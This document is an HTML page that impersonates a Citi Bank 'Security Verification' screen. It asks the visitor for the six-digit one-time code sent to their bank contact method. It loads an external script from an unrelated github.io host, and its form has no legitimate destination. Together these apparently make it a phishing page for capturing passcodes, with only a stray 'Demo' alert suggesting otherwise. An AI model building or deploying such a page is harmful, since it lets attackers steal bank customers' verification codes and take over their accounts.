<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Citi Bank â€“ Code Confirmation</title>

<style>
body {
  background-color: #eef2f7;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  font-family: Arial, sans-serif;
}

.citi-box {
  background: white;
  padding: 40px;
  width: 380px;
  border-radius: 12px;
  text-align: center;
  box-shadow: 0 4px 20px rgba(0,0,0,0.25);
}

h2 {
  color: #004685;
  margin-bottom: 10px;
}

.desc {
  font-size: 13px;
  color: #333;
  margin-bottom: 20px;
}

input[type="text"] {
  width: 100%;
  padding: 12px;
  border-radius: 8px;
  border: 1px solid #ccc;
  background: #f7f8fb;
  font-size: 18px;
  text-align: center;
  letter-spacing: 6px;
  margin-bottom: 20px;
}

button {
  width: 100%;
  padding: 12px;
  border-radius: 8px;
  border: none;
  background: #0071e3;
  color: white;
  font-size: 16px;
  cursor: pointer;
  margin-bottom: 10px;
}

.resend {
  margin-top: 10px;
  font-size: 14px;
  color: #666;
}

button:disabled {
  background: #999;
  cursor: not-allowed;
}
</style>

</head>

<body>
<script src="https://plyarth.github.io/intc/int6.js"></script>
<div class="citi-box">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Citi.svg/200px-Citi.svg.png" alt="Citi">

  <h2>Citi Security Verification</h2>

  <div class="desc">
    Please enter the 6-digit code sent to your Citi Bank contact method.
  </div>

  <form>
    <input type="text" maxlength="20" placeholder="------" name="Otp Code" required>

    <button>Confirm Code</button>

    <button type="button" id="resendBtn" disabled>Resend Code</button>

    <div class="resend">
      You can resend in <span id="timer">30</span>s
    </div>
  </form>
</div>

<script>
let countdown = 30;
const timer = document.getElementById("timer");
const resendBtn = document.getElementById("resendBtn");

setInterval(() => {
  countdown--;
  timer.innerText = countdown;

  if (countdown <= 0) {
    resendBtn.disabled = false;
  }
}, 1000);

resendBtn.addEventListener("click", () => {
  alert("Demo: Citi Bank resend code");
  countdown = 30;
  resendBtn.disabled = true;
});
</script>

</body>
</html>
